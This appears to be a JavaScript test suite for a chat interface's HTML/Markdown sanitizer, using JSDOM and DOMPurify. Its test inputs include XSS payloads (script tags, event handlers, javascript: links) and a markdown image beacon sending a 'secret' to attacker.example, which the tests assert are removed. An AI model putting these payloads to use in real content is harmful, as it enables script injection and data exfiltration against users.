import assert from 'node:assert/strict';
import { before, describe, it } from 'node:test';
import { JSDOM } from 'jsdom';

/** @type {typeof import('../../src/js/render.js')} */
let render;

before(async () => {
  // DOMPurify binds to the global window at import time; provide a real DOM first.
  const dom = new JSDOM('<!doctype html><html><body></body></html>');
  globalThis.window = dom.window;
  globalThis.document = dom.window.document;
  render = await import('../../src/js/render.js');
  const { default: DOMPurify } = await import('dompurify');
  assert.equal(DOMPurify.isSupported, true, 'DOMPurify must run against a real DOM, otherwise sanitize() is a no-op');
});

describe('escapeHtml', () => {
  it('escapes markup and quotes and coerces non-strings', () => {
    assert.equal(render.escapeHtml(`<img src=x onerror="a('b')">&`), '&lt;img src=x onerror=&quot;a(&#39;b&#39;)&quot;&gt;&amp;');
    assert.equal(render.escapeHtml(null), '');
    assert.equal(render.escapeHtml(42), '42');
  });
});

describe('renderMarkdown', () => {
  it('removes scripts, event handlers and inline styles', () => {
    const html = render.renderMarkdown('Hi <script>alert(1)</script><b onclick="x()" style="color:red">bold</b>');
    assert.doesNotMatch(html, /<script|onclick|style=/i);
    assert.match(html, /<b>bold<\/b>/);
  });

  it('drops images (exfiltration beacons) and iframes', () => {
    const html = render.renderMarkdown('![x](https://attacker.example/?q=secret) <iframe src="https://x"></iframe><img src=x onerror=alert(1)>');
    assert.doesNotMatch(html, /<img|<iframe|attacker/i);
  });

  it('neutralizes javascript: and data: links but keeps https links safe', () => {
    const html = render.renderMarkdown('[a](javascript:alert(1)) [b](data:text/html,x) [c](https://example.com)');
    assert.doesNotMatch(html, /javascript:|data:text/i);
    assert.match(html, /<a href="https:\/\/example\.com" target="_blank" rel="noopener noreferrer nofollow">c<\/a>/);
  });

  it('strips data-* attributes so content cannot trigger delegated UI actions', () => {
    const html = render.renderMarkdown('<a data-action="clear-keys" data-arg="x" href="https://example.com">x</a><span data-change="change-engine">y</span>');
    assert.doesNotMatch(html, /data-action|data-arg|data-change/);
  });

  it('strips class/id attributes so content cannot restyle the UI', () => {
    const html = render.renderMarkdown('<div class="fixed inset-0" id="chatInput">x</div>');
    assert.doesNotMatch(html, /class=|id=/);
  });

  it('renders ordinary Markdown', () => {
    const html = render.renderMarkdown('# Titel\n\n* eins\n* zwei\n\n`code`');
    assert.match(html, /<h1>Titel<\/h1>/);
    assert.match(html, /<li>eins<\/li>/);
    assert.match(html, /<code>code<\/code>/);
  });
});

describe('escapeMarkdown', () => {
  it('prevents values from creating links, images, headings or HTML', () => {
    const value = '[click](javascript:alert(1)) ![i](https://x) # h <b>x</b>\nnext';
    const html = render.renderMarkdown(`* ${render.escapeMarkdown(value)}`);
    assert.doesNotMatch(html, /<a |<img|<h1|<b>/);
    assert.match(html, /\[click\]/);
  });
});

describe('sanitizeModelNames', () => {
  it('replaces provider and model identifiers with a neutral label', () => {
    assert.equal(render.sanitizeModelNames('HTTP 429 from Google Gemini 2.5 Flash'), 'HTTP 429 from AI model');
    assert.equal(render.sanitizeModelNames('[nvidia/nemotron-3.5-lightning:free] empty'), '[AI model] empty');
    assert.equal(render.sanitizeModelNames(''), '');
  });

  it('only replaces whole words', () => {
    const text = 'Philosophy, liquidity and llamas stay untouched.';
    assert.equal(render.sanitizeModelNames(text), text);
  });
});
